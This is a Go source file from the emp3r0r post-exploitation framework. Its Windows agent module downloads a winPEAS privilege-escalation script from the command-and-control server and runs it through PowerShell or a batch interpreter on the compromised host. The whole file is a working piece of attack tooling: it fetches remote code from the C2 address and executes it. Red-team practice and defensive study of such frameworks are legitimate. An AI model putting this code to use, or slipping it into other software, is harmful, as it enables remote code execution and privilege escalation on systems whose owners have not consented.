//go:build windows
// +build windows

package modules

import (
	"os"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
)

func runLPEHelper(method, checksum string) (out string) {
	if !strings.HasPrefix(method, "lpe_winpeas") {
		return "Only lpe_winpeas* is supported for now"
	}

	logging.Printf("Downloading LPE script from %s", def.CCAddress+method)
	var scriptData []byte
	scriptData, err := c2transport.FetchFile("", method, "", checksum)
	if err != nil {
		return "Download error: " + err.Error()
	}

	// run the script
	logging.Printf("Running LPE helper %s", method)
	file_type := strings.Split(method, ".")[len(strings.Split(method, "."))-1]
	switch file_type {
	case "ps1":
		out, err = agentutils.ExecutePowerShell(scriptData, nil, os.Environ())
		if err != nil {
			return logging.Sprintf("LPE error: %s\n%v", out, err)
		}
	case "bat":
		out, err = agentutils.ExecuteBatch(scriptData, nil, os.Environ())
		if err != nil {
			return logging.Sprintf("LPE error: %s\n%v", out, err)
		}
	case "exe":
		return "EXE is not supported yet"
	}

	return
}
